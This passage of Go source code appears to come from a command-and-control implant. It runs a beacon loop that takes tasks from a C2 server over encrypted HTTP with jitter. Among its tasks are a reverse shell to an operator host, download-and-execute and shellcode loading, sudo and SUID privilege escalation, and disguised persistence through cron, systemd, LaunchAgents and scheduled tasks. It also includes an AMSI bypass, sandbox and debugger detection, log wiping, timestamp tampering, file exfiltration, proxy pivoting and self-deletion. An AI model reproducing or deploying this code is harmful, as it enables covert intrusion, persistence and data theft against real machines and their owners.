        output, err := executeCommandWithRetry(shellCommand, "sudo -n -l")
        if err != nil {
            if lazyconf.DebugImplant == "True" {
                fmt.Printf("[ERROR] Failed to run sudo -l: %v\n", err)
            }
 
            
            return
        }

        
        if strings.Contains(output, "(ALL) NOPASSWD") {
            if lazyconf.DebugImplant == "True" {
                fmt.Println("[INFO] Potential sudo privilege escalation detected: NOPASSWD found")
            }
            
            escalateCmd := "sudo -n whoami"
            escalateOutput, escalateErr := executeCommandWithRetry(shellCommand, escalateCmd)
            if escalateErr == nil && strings.Contains(escalateOutput, "root") {
                if lazyconf.DebugImplant == "True" {
                    fmt.Println("[SUCCESS] Escalated to root via sudo NOPASSWD")
                }
            } else {
                if lazyconf.DebugImplant == "True" {
                    fmt.Printf("[ERROR] Failed to escalate via sudo: %v\n", escalateErr)
                }
            }
        } else {
            if lazyconf.DebugImplant == "True" {
                fmt.Println("[INFO] No NOPASSWD privileges detected")
            }
        }

        checkSetuidBinaries( lazyconf)
    }()
}


func checkSetuidBinaries(lazyconf LazyDataType) {
    shellCommand := getShellCommand("-c")
    
    suidCmd := "find / -perm -4000 -type f 2>/dev/null"
    output, err := executeCommandWithRetry(shellCommand, suidCmd)
    if err != nil {
        if lazyconf.DebugImplant == "True" {
            fmt.Printf("[ERROR] Failed to check SUID binaries: %v\n", err)
        }
        return
    }

    
    exploitableSUID := []string{"/bin/su", "/usr/bin/passwd", "/usr/bin/gpasswd", "/usr/bin/chsh"}
    foundSUID := false
    for _, binary := range strings.Split(output, "\n") {
        for _, exploit := range exploitableSUID {
            if strings.Contains(binary, exploit) {
                foundSUID = true
                if lazyconf.DebugImplant == "True" {
                    fmt.Printf("[INFO] Found exploitable SUID binary: %s\n", binary)
                }
            }
        }
    }

    if !foundSUID {
        if lazyconf.DebugImplant == "True" {
            fmt.Println("[INFO] No exploitable SUID binaries found")
        }
    }
}

func checkDebuggers(lazyconf LazyDataType) bool {
    var cmd string
    switch runtime.GOOS {
    case "windows":
        cmd = "tasklist"
    case "linux", "darwin":
        cmd = "ps aux"
        if isRoot() {
            ifRoot(lazyconf)
        } else {
            if lazyconf.DebugImplant == "True" {
                println("[INFO] Not running with root privileges (Linux/macOS)")
            }
            iamgroot = false
        }
    default:
        return false
    }

    shellCommand := getShellCommand("-c")
    var args []string
    if len(shellCommand) > 1 {
        args = append(args, shellCommand[1]) 
    }
    args = append(args, cmd) 

    out, err := exec.Command(shellCommand[0], args...).Output()
    if err != nil {
        fmt.Println("Error:", err)
        return false
    }

    for _, tool := range debugTools[runtime.GOOS] {
        if strings.Contains(strings.ToLower(string(out)), tool) {
            return true
        }
    }
    return false
}

func isSandboxEnvironment(lazyconf LazyDataType) bool {
    if runtime.NumCPU() <= 1 {

        return true
    }
    var m runtime.MemStats
    runtime.ReadMemStats(&m)
    if m.Sys < 6<<30 {
        return true
    }
    if runtime.GOOS == "linux" {
        hasVirtualDisk := false
        if _, err := os.Stat("/sys/block/vda"); err == nil {
            hasVirtualDisk = true
        }
        if _, err := os.Stat("/dev/vda"); err == nil {
            hasVirtualDisk = true
        }
        if hasVirtualDisk {
            if lazyconf.DebugImplant == "True" {
                fmt.Println("[DEBUG] Possible sandbox: Virtual disk detected")
            }
            
            if _, err := os.Stat("/proc/self/status"); err == nil {
                data, _ := os.ReadFile("/proc/self/status")
                if strings.Contains(string(data), "TracerPid:") {
                    return true 
                }
            }
        }
    }
    return false
}

func initEncryptionContext(keyHex string) *PacketEncryptionContext {
    keyBytes, err := hex.DecodeString(keyHex)
    if err != nil {
        return nil
    }
    return &PacketEncryptionContext{
        AesKey:  &Aes256Key{Key: keyBytes},
        Valid:   true,
        Enabled: true,
    }
}

func initStealthMode(lazyconf LazyDataType) {
    if STEALTH == "True" || STEALTH == "true" {
        stealthModeEnabled = true
        if lazyconf.DebugImplant == "True" {
            fmt.Println("[INFO] Stealth mode initialized as ENABLED")
        }
    } else {
        stealthModeEnabled = false
        if lazyconf.DebugImplant == "True" {
            fmt.Println("[INFO] Stealth mode initialized as DISABLED")
        }
    }
}

func handleStealthCommand(command string, lazyconf LazyDataType) {
    switch command {
    case "stealth_on":
        stealthModeEnabled = true
        if lazyconf.DebugImplant == "True" {
            fmt.Println("[INFO] Stealth mode ENABLED by command")
        }
    case "stealth_off":
        stealthModeEnabled = false
        if lazyconf.DebugImplant == "True" {
            fmt.Println("[INFO] Stealth mode DISABLED by command")
        }
    default:
        
    }
}

func simulateLegitimateTraffic(lazyconf LazyDataType) {
    for {
        userAgent := USER_AGENTS[mathrand.Intn(len(USER_AGENTS))]
        headers := make(http.Header)
        for key, value := range HEADERS {
            headers.Set(key, value)
        }
        headers.Set("User-Agent", userAgent)

        
        url := URLS[mathrand.Intn(len(URLS))]

        
        client := &http.Client{}
        req, err := http.NewRequest("GET", url, nil)
        if err != nil {
            if lazyconf.DebugImplant == "True" {
                fmt.Printf("[!] Error creating requests: %v\n", err)
            }
            simulationFailed = true
            return
        }
        req.Header = headers

        resp, err := client.Do(req)
        if err != nil {
            if lazyconf.DebugImplant == "True" {
                fmt.Printf("[!] Error during simulation: %v\n", err)
            }
            simulationFailed = true
            return
        }
        defer resp.Body.Close()

        if resp.StatusCode == 200 {
            if lazyconf.DebugImplant == "True" {
                fmt.Printf("[INFO] Simulation success: %s\n", url)
            }
        } else {
            if lazyconf.DebugImplant == "True" {
                fmt.Printf("[-] Error in the matrix: %d\n", resp.StatusCode)
                simulationFailed = true
            }
        }
        
        time.Sleep(time.Duration(mathrand.Intn(31)+30) * time.Second)
    }
}

func globalRecover() {
    if r := recover(); r != nil {
        fmt.Printf("[RECOVER] Critical error: %v\n", r)
        restartClient()
    }
}

func restartClient() {
    executable, _ := os.Executable()
    cmd := exec.Command(executable)
    cmd.Start()
    os.Exit(1)
}
func ensureCrontabPersistence(lazyconf LazyDataType) error {
    executable, err := os.Executable()
    if err != nil {
        if lazyconf.DebugImplant == "True" {
            fmt.Printf("[ERROR] Failed to get executable path: %v\n", err)
        }
        return fmt.Errorf("failed to get executable path: %w", err)
    }
    cronCmd := fmt.Sprintf("* * * * * %s\n", executable)
    cron := fmt.Sprintf("echo '%s' | crontab -", cronCmd)
    shellCommand := getShellCommand("-c")
    output, err := executeCommandWithRetry(shellCommand, cron)
    if err != nil {
        if lazyconf.DebugImplant == "True" {
            fmt.Printf("[ERROR] Failed to set crontab persistence: %v, output: %s\n", err, output)
        }
        return fmt.Errorf("failed to set crontab persistence: %w", err)
    }

    if lazyconf.DebugImplant == "True" {
        fmt.Printf("[INFO] Successfully set crontab persistence: %s\n", cronCmd)
    }
    return nil
}
func ensurePersistenceMacOS() error {
    homeDir, _ := os.UserHomeDir()
    plistPath := filepath.Join(homeDir, "Library/LaunchAgents/com.system.maintenance.plist")
    executable, _ := os.Executable()
    plistContent := fmt.Sprintf(`
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.system.maintenance</string>
    <key>ProgramArguments</key>
    <array>
        <string>%s</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>
`, executable)
    return os.WriteFile(plistPath, []byte(plistContent), 0644)
}
func ensurePersistence(lazyconf LazyDataType) error {
    executable, err := os.Executable()
    if err != nil {
        if lazyconf.DebugImplant == "True" {
            return fmt.Errorf("failed to get executable path: %w", err)
        }
    }

    
    if runtime.GOOS == "windows" {
        taskName := 'S' + 'y' + 's' + 't' + 'e' + 'm' + 'M' + 'a' + 'i' + 'n' + 't'+ 'e' + 'n' + 'a' + 'n' + 'c' + 'e' + 'T' + 'a' + 's' + 'k'
        taskCmd := fmt.Sprintf(`schtasks /create /tn "%s" /tr "%s" /sc daily /f`, string(taskName), executable)
        return exec.Command("cmd", "/C", taskCmd).Run()
    }

    
    if runtime.GOOS == "linux" {
        serviceContent := fmt.Sprintf(`
[Unit]
Description=System Maintenance Service

[Service]
ExecStart=%s
Restart=always
User=%s

[Install]
WantedBy=multi-user.target
`, executable, os.Getenv("USER"))

        servicePath := "/et"+"c/sy"+"ste"+"md/sy"+"stem/"+"syst"+"em-maint"+"enance.service"
        err := os.WriteFile(servicePath, []byte(serviceContent), 0644)
        if err != nil {
            return err
        }
        ensureCrontabPersistence(lazyconf)
        return exec.Command("systemctl", "enable", "system-maintenance").Run()
    }
    if runtime.GOOS == "darwin" {
        ensurePersistenceMacOS()
    }
    return nil
}
func selfDestruct(lazyconf LazyDataType) {
    if lazyconf.DebugImplant == "True" {
        fmt.Println("[INFO] Initiating self-destruct")
    }
    executable, _ := os.Executable()
    os.Remove(executable)
    if runtime.GOOS == "linux" {
        exec.Command("systemctl", "disable", "system-maintenance").Run()
        exec.Command("crontab", "-r").Run()
        os.Remove("/etc/systemd/system/system-maintenance.service")
    }
    os.Exit(0)
}
func captureNetworkConfig(ctx context.Context, lazyconf LazyDataType) error {
    go func() {
        defer globalRecover()
        var cmd string
        if runtime.GOOS == "windows" {
            cmd = "ipconfig /all"
        } else {
            cmd = "ifconfig || ip addr"
        }
        shellCommand := getShellCommand("-c")
        output, err := executeCommandWithRetry(shellCommand, cmd)
        if err != nil {
            if lazyconf.DebugImplant == "True" {
                fmt.Printf("[ERROR] Failed to capture network config: %v\n", err)
            }
            return
        }
        tempFile := "/tmp/netconfig.txt"
        if runtime.GOOS == "windows" {
            tempFile = os.TempDir() + "\\netconfig.txt"
        }
        if err := os.WriteFile(tempFile, []byte(output), 0600); err != nil {
            if lazyconf.DebugImplant == "True" {
                fmt.Printf("[ERROR] Failed to write network config to file: %v\n", err)
            }
            return
        }
        uploadFile(ctx, tempFile)
        if lazyconf.DebugImplant == "True" {
            fmt.Println("[INFO] Network configuration captured and uploaded")
        }
    }()
    return nil
}
func EncryptPacket(ctx *PacketEncryptionContext, packet []byte) ([]byte, error) {
    block, err := aes.NewCipher(ctx.AesKey.Key)
    if err != nil {
        return nil, err
    }

    iv := make([]byte, aes.BlockSize)
    if _, err := rand.Read(iv); err != nil {
        return nil, err
    }

    encryptedData := make([]byte, aes.BlockSize+len(packet))
    copy(encryptedData, iv)

    stream := cipher.NewCFBEncrypter(block, iv)
    stream.XORKeyStream(encryptedData[aes.BlockSize:], packet)

    return encryptedData, nil
}

func SendShell(ip string, port int) {
	target := fmt.Sprintf("%s:%d", ip, port)
	con, err := net.Dial("tcp", target)
	if err != nil {
		fmt.Println("Error al conectar a", target, ":", err)
		return
	}
	defer con.Close()

	shellCommand := getShellCommand("-i")
	var args []string
	if len(shellCommand) > 1 {
		args = append(args, shellCommand[1])
	}
	cmd := exec.Command(shellCommand[0], args...)
	cmd.Stdin = con
	cmd.Stdout = con
	cmd.Stderr = con
	err = cmd.Run()
	if err != nil {
		fmt.Println("Error al ejecutar el comando shell en", target, ":", err)
		return
	}
}

func DecryptPacket(ctx *PacketEncryptionContext, encryptedData []byte) ([]byte, error) {
    block, err := aes.NewCipher(ctx.AesKey.Key)
    if err != nil {
        return nil, err
    }

    if len(encryptedData) < aes.BlockSize {
        return nil, errors.New("encrypted data too short")
    }

    iv := encryptedData[:aes.BlockSize]
    encryptedData = encryptedData[aes.BlockSize:]

    stream := cipher.NewCFBDecrypter(block, iv)
    stream.XORKeyStream(encryptedData, encryptedData)

    return encryptedData, nil
}

func sendRequest(ctx context.Context, url, method, body string, filePath string) (*http.Response, error) {
    tr := &http.Transport{
        TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
    }
    client := &http.Client{
        Transport: tr,
        Timeout:   30 * time.Second,
    }

    var req *http.Request
    var err error

    if filePath != "" {
        file, err := os.Open(filePath)
        if err != nil {
            return nil, fmt.Errorf("file open error: %w", err)
        }
        defer file.Close()

        bodyBuffer := &bytes.Buffer{}
        writer := multipart.NewWriter(bodyBuffer)
        part, err := writer.CreateFormFile("file", filepath.Base(filePath))
        if err != nil {
            return nil, fmt.Errorf("multipart create error: %w", err)
        }

        if _, err = io.Copy(part, file); err != nil {
            return nil, fmt.Errorf("file copy error: %w", err)
        }
        writer.Close()

        req, err = http.NewRequestWithContext(ctx, method, url, bodyBuffer)
        if err != nil {
            return nil, fmt.Errorf("request creation error: %w", err)
        }
        req.Header.Set("Content-Type", writer.FormDataContentType())
    } else {
        encryptedBody, err := EncryptPacket(encryptionCtx, []byte(body))
        if err != nil {
            return nil, fmt.Errorf("encryption error: %w", err)
        }
        base64Body := base64.StdEncoding.EncodeToString(encryptedBody)
        req, err = http.NewRequestWithContext(ctx, method, url, strings.NewReader(base64Body))
        if err != nil {
            return nil, fmt.Errorf("request creation error: %w", err)
        }
        req.Header.Set("Content-Type", "text/plain")
    }

    //req.Header.Set("Authorization", "Basic "+base64.StdEncoding.EncodeToString([]byte(USERNAME+":"+PASSWORD)))
    userAgent := USER_AGENTS[mathrand.Intn(len(USER_AGENTS))]
    req.Header.Set("User-Agent", userAgent)

    resp, err := client.Do(req)
    if err != nil {
        return nil, fmt.Errorf("request failed: %w", err)
    }

    if resp.StatusCode != http.StatusOK {
        defer resp.Body.Close()
        errorBody, _ := io.ReadAll(resp.Body)
        return nil, fmt.Errorf("server error %d: %s", resp.StatusCode, string(errorBody))
    }

    if resp.Body != nil {
        defer resp.Body.Close()
        rawResponse, err := io.ReadAll(resp.Body)
        if err != nil {
            return nil, fmt.Errorf("response read error: %w", err)
        }

        encryptedResponse, err := base64.StdEncoding.DecodeString(string(rawResponse))


        decryptedResponse, err := DecryptPacket(encryptionCtx, encryptedResponse)
        if err != nil {
            return nil, fmt.Errorf("decryption error: %w", err)
        }

        resp.Body = io.NopCloser(bytes.NewReader(decryptedResponse))
    }

    return resp, nil
}

func retryRequest(ctx context.Context, url, method, body string, filePath string) (*http.Response, error) {
    for i := 0; i < MAX_RETRIES; i++ {
        resp, err := sendRequest(ctx, url, method, body, filePath)
        if err == nil {
            return resp, nil
        }
        fmt.Printf("[RETRY] Attempt %d/%d: %v\n", i+1, MAX_RETRIES, err)
        select {
        case <-ctx.Done():
            return nil, ctx.Err()
        case <-time.After(SLEEP):
        }
    }
    return nil, fmt.Errorf("max retries reached")
}

func executeCommandWithRetry(shellCommand []string, command string) (string, error) {
    ctx, cancel := context.WithTimeout(context.Background(), 120*time.Second)
    defer cancel()

    for i := 0; i < MAX_RETRIES; i++ {
        cmd := exec.CommandContext(ctx, shellCommand[0], shellCommand[1], command)
        var out bytes.Buffer
        cmd.Stdout = &out
        cmd.Stderr = &out

        err := cmd.Run()
        if err == nil {
            return out.String(), nil
        }

        fmt.Printf("[CMD RETRY] Attempt %d/%d: %v\n", i+1, MAX_RETRIES, err)
        time.Sleep(2 * time.Second)
    }
    return "", fmt.Errorf("command failed after %d attempts", MAX_RETRIES)
}

func getShellCommand(interactive string) []string {
    osName := runtime.GOOS
    switch osName {
    case "windows":
        if _, err := exec.LookPath("powershell"); err == nil {
            return []string{"powershell", "-Command"}
        }
        return []string{"cmd", "/C"}
    case "linux", "darwin":
        if _, err := exec.LookPath("bash"); err == nil {
            return []string{"bash", interactive}
        }
        return []string{"sh", "-c"}
    default:
        return []string{"sh", "-c"}
    }
}

func calculateJitteredSleep(baseSleep time.Duration, minJitterPercentage, maxJitterPercentage float64) time.Duration {
	jitterPercentage := minJitterPercentage + mathrand.Float64()*(maxJitterPercentage-minJitterPercentage)
	jitterRange := time.Duration(float64(baseSleep) * jitterPercentage)
	jitter := time.Duration(mathrand.Float64() * float64(jitterRange))
	jitteredSleep := baseSleep + jitter
	return jitteredSleep
}

func main() {
    defer globalRecover()
	mathrand.Seed(time.Now().UnixNano())
	baseSleepTime := SLEEP
	minJitterPercentage := 0.1
	maxJitterPercentage := 0.3
    keyHex := "{key}"
    var lazyconf LazyDataType
    var currentPortScanResults map[string][]int
    url := C2_URL + "/config.json"
        
    err := ReadJSONFromURL(url, &lazyconf)
	if err != nil {
        fmt.Println("Error:", err)
		return
	}
    if lazyconf.DebugImplant == "True" {
        fmt.Println("[INFO] Reading JSON from URL:", url)
    }
    result_pwd, err = os.Getwd()
    if err != nil {
        if lazyconf.DebugImplant == "True" {
            fmt.Println("Error getting current working directory:", err)
        }
    }
    initStealthMode(lazyconf)
    encryptionCtx = initEncryptionContext(keyHex)
    if encryptionCtx == nil {
        if lazyconf.DebugImplant == "True" {
            fmt.Println("[FATAL] Failed to initialize encryption")
        }
        time.Sleep(30 * time.Second)
        restartClient()
    }

    shellCommand := getShellCommand("-c")
    baseCtx := context.Background()
    for {
        func() {        
            defer globalRecover()
            
            ctx, cancel := context.WithTimeout(baseCtx, 180*time.Second)
            defer cancel()

            resp, err := retryRequest(ctx, C2_URL+MALEABLE+CLIENT_ID, "GET", "", "")
            if err != nil {
                if lazyconf.DebugImplant == "True" {
                    fmt.Printf("[ERROR] Main request failed: %v\n", err)
                }
                return
            }

            body, err := io.ReadAll(resp.Body)
            if err != nil {
                if lazyconf.DebugImplant == "True" {
                    fmt.Printf("[ERROR] Failed to read response: %v\n", err)
                }
                return
            }

            command := strings.TrimSpace(string(body))
            if command == "" {
                return
            }
            
            handleStealthCommand(command, lazyconf)
            if stealthModeEnabled {
                if lazyconf.DebugImplant == "True" {
                    fmt.Println("[DEBUG] Stealth mode is active. Skipping activity.")
                }
                return
            }   
  

            if !strings.Contains(command, "stealth") {
                switch {
                case strings.HasPrefix(command, "download:"):
                    handleDownload(ctx, command)
                case strings.HasPrefix(command, "upload:"):
                    handleUpload(ctx, command)
                case strings.HasPrefix(command, "rev:"):
                    go SendShell(LHOST, lazyconf.ReverseShellPort)
                case strings.HasPrefix(command, "exfil:"):
					handleExfiltrate(ctx, command, lazyconf)
                case strings.HasPrefix(command, "download_exec:"):
                    url := strings.TrimPrefix(command, "download_exec:")
                    go downloadAndExecute(ctx, url, lazyconf)
                case strings.HasPrefix(command, "obfuscate:"):
                    filePath := strings.TrimPrefix(command, "obfuscate:")
                    if filePath == "" {
                        if lazyconf.DebugImplant == "True" {
                            fmt.Println("[ERROR] Invalid obfuscate command format, expected obfuscate:<file_path>")
                        }
                    }
                    if err := obfuscateFileTimestamps(lazyconf, filePath); err != nil {
                        if lazyconf.DebugImplant == "True" {
                            fmt.Printf("[ERROR] Failed to obfuscate timestamps: %v\n", err)
                        }
                    }
                case strings.HasPrefix(command, "cleanlogs:"):
                    if err := cleanSystemLogs(lazyconf); err != nil {
                        if lazyconf.DebugImplant == "True" {
                            fmt.Printf("[ERROR] Failed to clean system logs: %v\n", err)
                        }
                    }                  
                case strings.HasPrefix(command, "discover:"):
	                go discoverHostsOnce.Do(func() {
                        discoverLocalHosts(lazyconf)
                    })
                case strings.HasPrefix(command, "migrate:"):
                    osName := runtime.GOOS
                    switch osName {
                    case "windows":
                        rest := strings.TrimPrefix(command, "migrate:")
                        parts := strings.SplitN(rest, ",", 2)  // Máximo 2 partes

                        targetPath := strings.TrimSpace(parts[0])
                        var payloadPath string
                        if len(parts) > 1 {
                            payloadPath = strings.TrimSpace(parts[1])
                        }

                        go overWrite(targetPath, payloadPath)
                     case "linux", "darwin":
                        if lazyconf.DebugImplant == "True" {
                                fmt.Println("migrate is not implemented in linux/darwin systems.")
                        }
                    default:
                        if lazyconf.DebugImplant == "True" {
                            fmt.Println("migrate is not implemented in this system.")
                        }
                    }
                    
                case strings.HasPrefix(command, "shellcode:"):
                    url := strings.TrimPrefix(command, "shellcode:")
	                go executeLoader(url)

                case strings.HasPrefix(command, "amsi:"):
                        osName := runtime.GOOS
                        switch osName {
                        case "windows":
                            if err := patchAMSI(); err != nil {
                                fmt.Println(err)
                            } else {
                                if lazyconf.DebugImplant == "True" {
                                    fmt.Println("AMSI bypass successful. Test with PowerShell or WMI scripts.")
                                }
                            }
                        case "linux", "darwin":
                            if lazyconf.DebugImplant == "True" {
                                    fmt.Println("AMSI bypass is not implemented in linux/darwin systems.")
                            }
                        default:
                            if lazyconf.DebugImplant == "True" {
                                fmt.Println("AMSI bypass is not implemented in this system.")
                            }
                        }
                    
                case strings.HasPrefix(command, "adversary:"):
                    if err := handleAdversary(ctx, command, lazyconf, currentPortScanResults); err != nil {
                        if lazyconf.DebugImplant == "True" {
                            fmt.Printf("[ERROR] Failed to handle adversary command: %v\n", err)
                        }
                    }
                case strings.HasPrefix(command, "softenum:"):
	                soft, err := GetUsefulSoftware()
                    if lazyconf.DebugImplant == "True" {
                        println("[INFO] Useful software found:")
                        if err != nil {
                            println("[ERROR] Error al buscar software:", err)
                        }
                        for _, s := range soft {
                            if s != "" {
                                println(" -", s)
                            }
                        }
                    }
                    if len(soft) != 0 {
                        softstring := strings.Join(soft, ", ")
                        if lazyconf.DebugImplant == "True" {
                            fmt.Println("Calling handleResponse with message:", softstring)
                        }                        
                        handleResponse(ctx, command, softstring, lazyconf, currentPortScanResults)
                    } 
                case strings.HasPrefix(command, "netconfig:"):
                    if err := captureNetworkConfig(ctx,lazyconf); err != nil {
                        if lazyconf.DebugImplant == "True" {
                            fmt.Printf("[ERROR] Failed to capture network config: %v\n", err)
                        }
                    } else {
                        if lazyconf.DebugImplant == "True" {
                            fmt.Println("[INFO] Network configuration captured and uploaded")
                        }
                    }
                case strings.HasPrefix(command, "escalatelin:"):
                    tryPrivilegeEscalation(lazyconf)
                case strings.HasPrefix(command, "proxy:"):
                    parts := strings.Split(strings.TrimPrefix(command, "proxy:"), ":")
                    if len(parts) != 4 {
                        if lazyconf.DebugImplant == "True" {
                            fmt.Println("[ERROR] Invalid proxy command format, expected proxy:<listenIP>:<listenPort>:<targetIP>:<targetPort>")
                        }
                        retryRequest(ctx, C2_URL+MALEABLE+CLIENT_ID, "POST", `{"error":"Invalid proxy command format"}`, "")
                        break
                    }
                    //Envía el comando proxy:0.0.0.0:8080:127.0.0.1:8000 desde el C2.
                    //Conéctate al puerto 8080 del sistema comprometido (por ejemplo, nc <IP>:8080).
                    //Verifica que el tráfico se redirija al targetAddr.
                    //Envía stop_proxy:0.0.0.0:8080 y confirma que el proxy se detiene (revisa los logs de depuración).
                    listenAddr := parts[0] + ":" + parts[1]
                    targetAddr := parts[2] + ":" + parts[3]
                    if err := startProxy(lazyconf, listenAddr, targetAddr); err != nil {
                        if lazyconf.DebugImplant == "True" {
                            fmt.Printf("[ERROR] Failed to start proxy: %v\n", err)
                        }
                        retryRequest(ctx, C2_URL+MALEABLE+CLIENT_ID, "POST", fmt.Sprintf(`{"error":"Failed to start proxy: %v"}`, err), "")
                    } else {
                        if lazyconf.DebugImplant == "True" {
                            fmt.Printf("[INFO] Proxy started on %s to %s\n", listenAddr, targetAddr)
                        }
                        retryRequest(ctx, C2_URL+MALEABLE+CLIENT_ID, "POST", fmt.Sprintf(`{"message":"Proxy started on %s to %s"}`, listenAddr, targetAddr), "")
                    }
                case strings.HasPrefix(command, "stop_proxy:"):
                    listenAddr := strings.TrimPrefix(command, "stop_proxy:")
                    if listenAddr == "" {
                        if lazyconf.DebugImplant == "True" {
                            fmt.Println("[ERROR] Invalid stop_proxy command format, expected stop_proxy:<listenAddr>")
                        }
                    }
                    if err := stopProxy(listenAddr, lazyconf); err != nil {
                        if lazyconf.DebugImplant == "True" {
                            fmt.Printf("[ERROR] Failed to stop proxy: %v\n", err)
                        }
                    } else {
                        if lazyconf.DebugImplant == "True" {
                            fmt.Printf("[INFO] Proxy stopped on %s\n", listenAddr)
                        }
                    }
                case strings.HasPrefix(command, "portscan:"):
                    timeout := 2 * time.Second
                    currentPortScanResults = PortScanner(discoveredLiveHosts + ", " + lazyconf.Rhost, lazyconf.Ports, timeout) 
                    results_portscan = currentPortScanResults
                    for ip, openPorts := range currentPortScanResults {
                        if len(openPorts) > 0 {
                            if lazyconf.DebugImplant == "True" {
                                fmt.Printf("IP%s has open ports: %v\n", ip, openPorts)
                            }
                        } else {
                            if lazyconf.DebugImplant == "True" {
                                fmt.Printf("IP%s has no open ports\n", ip)
                            }
                        }
                    }
                case strings.HasPrefix(command, "compressdir:"):
                    inputDir := strings.TrimPrefix(command, "compressdir:")
                    if inputDir == "" {
                        if lazyconf.DebugImplant == "True" {
                            fmt.Println("[ERROR] Invalid compressdir command format, expected compressdir:<directory_path>")
                        }
                    }
                    dirName := filepath.Base(inputDir)
                    currentTime := time.Now().Format("20060102")
                    outputFileName := fmt.Sprintf("%s_%s_%s.tar.gz", dirName, CLIENT_ID, currentTime)
                    outputFilePath := filepath.Join(filepath.Dir(inputDir), outputFileName)
                    message := ""
                    if _, err := os.Stat(inputDir); os.IsNotExist(err) {
                        message = "[ERROR] Directory not found"
                        if lazyconf.DebugImplant == "True" {
                            fmt.Printf("[ERROR] Directory not found: %s\n", inputDir)
                        }
                        break
                    }

                    if err := compressGzipDir(ctx, inputDir, outputFilePath, lazyconf); err != nil {
                        message = "[ERROR] Failed to compress directory"
                        if lazyconf.DebugImplant == "True" {
                            fmt.Printf("[ERROR] Failed to compress directory '%s': %v\n", inputDir, err)
                        }
                    } else {
                        message = "[INFO] Successfully compressed directory"
                        if lazyconf.DebugImplant == "True" {
                            fmt.Printf("[INFO] Successfully compressed directory to: %s\n", outputFilePath)
                        }
                    }
                    if message != "" {
                        if lazyconf.DebugImplant == "True" {
                            fmt.Println("Calling handleResponse with message:", message)
                        }                        
                        handleResponse(ctx, command, message, lazyconf, currentPortScanResults)
                    } 
                case strings.Contains(command, "simulate:"):
                    message := "[INFO] Simulation Started..."
                    if lazyconf.DebugImplant == "True" {
                        fmt.Println(message)
                    }
                    if !simulationFailed {
                        go simulateLegitimateTraffic(lazyconf)
                    } else {
                        message = "[INFO] Simulation skipped due to previous failure."
                        if lazyconf.DebugImplant == "True" {
                            fmt.Println(message)
                        }
                    }
                    if message != "" {
                        if lazyconf.DebugImplant == "True" {
                            fmt.Println("Calling handleResponse with message:", message)
                        }                        
                        handleResponse(ctx, command, message, lazyconf, currentPortScanResults)
                    }                     
                case strings.Contains(command, "persist:"):
                    message := ""
                    if lazyconf.DebugImplant == "True" {
                        fmt.Println("[INFO] persist command started")
                    }                    
                    ensurePersistence(lazyconf)
                    message = "[INFO] persist command ended"
                    if lazyconf.DebugImplant == "True" {
                        fmt.Println()
                    }
                    if message != "" {
                        if lazyconf.DebugImplant == "True" {
                            fmt.Println("Calling handleResponse with message:", message)
                        }                        
                        handleResponse(ctx, command, message, lazyconf, currentPortScanResults)
                    }                    
                case strings.Contains(command, "debug:"):
                    message := ""
                    if checkDebuggers(lazyconf) {
                        message = "[INFO] We are under debugger"
                        if lazyconf.DebugImplant == "True" {
                            fmt.Println(message)
                        }
                    } else {
                        message = "[INFO] We aren't under debugger."
                        if lazyconf.DebugImplant == "True" {
                            fmt.Println(message)
                        }
                    }
                    if message != "" {
                        if lazyconf.DebugImplant == "True" {
                            fmt.Println("Calling handleResponse with message:", message)
                        }                        
                        handleResponse(ctx, command, message, lazyconf, currentPortScanResults)
                    }
                case strings.Contains(command, "isvm:"):
                    message := ""
                    if isVMByMAC() {
                        message = "[INFO] This is a VM"
                        if lazyconf.DebugImplant == "True" {
                            fmt.Println(message)
                        }
                    } else {
                        message = "[INFO] This is not a VM"
                        if lazyconf.DebugImplant == "True" {
                            fmt.Println(message)
                        }
                    }
                    if message != "" {
                        if lazyconf.DebugImplant == "True" {
                            fmt.Println("Calling handleResponse with message:", message)
                        }                        
                        handleResponse(ctx, command, message, lazyconf, currentPortScanResults)
                    }
                case strings.Contains(command, "sandbox:"):
                    message := ""
                    if isSandboxEnvironment(lazyconf) {
                        message = "[INFO] This is a sandbox environment"
                        if lazyconf.DebugImplant == "True" {
                            fmt.Println(message)
                        }
                    }else{
                        message = "[INFO] This is not a sandbox environment"
                        if lazyconf.DebugImplant == "True" {
                            fmt.Println(message)
                        }
                    }
                    if message != "" {
                        if lazyconf.DebugImplant == "True" {
                            fmt.Println("Calling handleResponse with message:", message)
                        }                        
                        handleResponse(ctx, command, message, lazyconf, currentPortScanResults)
                    }
                case strings.Contains(command, "terminate:"):
                    if lazyconf.DebugImplant == "True" {
                        fmt.Println("[INFO] terminate command")
                    }
                    selfDestruct(lazyconf)
                    os.Exit(0)
                default:
                    handleCommand(ctx, command, shellCommand, lazyconf, currentPortScanResults)
                }
            }

        }()
		sleepTime := calculateJitteredSleep(baseSleepTime, minJitterPercentage, maxJitterPercentage)
		time.Sleep(sleepTime)
    }
}

func handleDownload(ctx context.Context, command string) {
    defer globalRecover()
    filePath := strings.TrimPrefix(command, "download:")
    fileURL := C2_URL + MALEABLE + "/download/" + filePath

    resp, err := retryRequest(ctx, fileURL, "GET", "", "")
    if err != nil {
        fmt.Printf("[ERROR] Download failed: %v\n", err)
        return
    }

    fileData, err := io.ReadAll(resp.Body)
    if err != nil {
        fmt.Printf("[ERROR] Failed to read downloaded file: %v\n", err)
        return
    }

    err = os.WriteFile(filepath.Base(filePath), fileData, 0644)
    if err != nil {
        fmt.Printf("[ERROR] Failed to write file: %v\n", err)
    }
}

func handleUpload(ctx context.Context, command string) {
    defer globalRecover()
    filePath := strings.TrimPrefix(command, "upload:")
    resp, err := retryRequest(ctx, C2_URL+MALEABLE+"/upload", "POST", "", filePath)
    if err != nil {
        fmt.Printf("[ERROR] Upload failed: %v\n", err)
        return
    }
    
    if resp.StatusCode != http.StatusOK {
        fmt.Printf("[ERROR] Upload failed with status: %d\n", resp.StatusCode)
    }
}

func handleCommand(ctx context.Context, command string, shellCommand []string, lazyconf LazyDataType, resultadosEscaneo map[string][]int) {
    defer globalRecover()
    output, err := executeCommandWithRetry(shellCommand, command)
    if err != nil {
        if lazyconf.DebugImplant == "True" {
            output = fmt.Sprintf("Command execution error: %v", err)
        }
    }

    pid := os.Getpid()
    hostname, _ := os.Hostname()
    ips := getIPs()
    
    currentUser, _ := user.Current()

